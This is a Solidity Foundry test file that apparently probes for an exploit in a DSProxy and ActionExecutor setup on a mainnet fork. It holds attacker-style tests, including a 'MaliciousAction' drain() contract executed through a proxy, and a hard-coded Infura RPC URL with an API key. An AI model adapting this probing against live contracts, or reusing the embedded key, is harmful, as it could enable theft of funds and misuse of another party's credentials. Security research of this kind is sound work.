// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDSProxy {
    function execute(address _target, bytes memory _data) external payable returns (bytes32);
    function owner() external view returns (address);
    function authority() external view returns (address);
}

interface IDSProxyFactory {
    function build() external returns (address);
    function build(address owner) external returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract ProxySearchExploitTest is Test {
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant STRATEGY = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant DSPROXY_FACTORY = 0xA26e15C895EFc0616177B7c1e7270A4C7D51C997;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CreateDSProxyAndCallActionExecutor() public {
        console.log("=== CREATE DSPROXY AND CALL ACTION EXECUTOR ===\n");
        
        vm.startPrank(attacker);
        
        address proxyAddr = IDSProxyFactory(DSPROXY_FACTORY).build(attacker);
        console.log("Attacker's DSProxy:", proxyAddr);
        
        IDSProxy proxy = IDSProxy(proxyAddr);
        
        bytes memory actionExecutorCall = abi.encodeWithSignature(
            "executeActions(bytes4[],bytes[],uint8[][])",
            new bytes4[](0),
            new bytes[](0),
            new uint8[][](0)
        );
        
        try proxy.execute(ACTION_EXECUTOR, actionExecutorCall) returns (bytes32 result) {
            console.log("Execute succeeded!");
            console.logBytes32(result);
        } catch {
            console.log("Execute failed");
        }
        
        vm.stopPrank();
    }

    function test_DSProxyWithMaliciousAction() public {
        console.log("=== DSPROXY WITH MALICIOUS ACTION ===\n");
        
        vm.startPrank(attacker);
        
        address proxyAddr = IDSProxyFactory(DSPROXY_FACTORY).build(attacker);
        IDSProxy proxy = IDSProxy(proxyAddr);
        
        vm.stopPrank();
        
        // Give proxy some wstETH
        address whale = 0x3c22ec75ea5D745c78fc84762F7F1E6D82a2c5BF;
        vm.startPrank(whale);
        IERC20(wstETH).transfer(proxyAddr, 1 ether);
        vm.stopPrank();
        
        vm.startPrank(attacker);
        
        uint256 proxyBalance = IERC20(wstETH).balanceOf(proxyAddr);
        console.log("Proxy wstETH balance:", proxyBalance);
        
        MaliciousAction malicious = new MaliciousAction();
        
        bytes memory maliciousCall = abi.encodeWithSignature(
            "drain(address,address,uint256)",
            wstETH, attacker, proxyBalance
        );
        
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        
        try proxy.execute(address(malicious), maliciousCall) {
            uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);
            console.log("Attacker received:", attackerAfter - attackerBefore);
        } catch {
            console.log("Failed");
        }
        
        vm.stopPrank();
    }

    function test_CheckIfStrategyIsDSProxy() public view {
        console.log("=== CHECKING IF STRATEGY IS A DSPROXY ===\n");
        
        try IDSProxy(STRATEGY).owner() returns (address owner) {
            console.log("Strategy owner():", owner);
        } catch {
            console.log("Strategy doesn't have owner()");
        }
        
        try IDSProxy(STRATEGY).authority() returns (address auth) {
            console.log("Strategy authority():", auth);
        } catch {
            console.log("Strategy doesn't have authority()");
        }
    }
}

contract MaliciousAction {
    function drain(address token, address to, uint256 amount) external {
        IERC20(token).transfer(to, amount);
    }
}
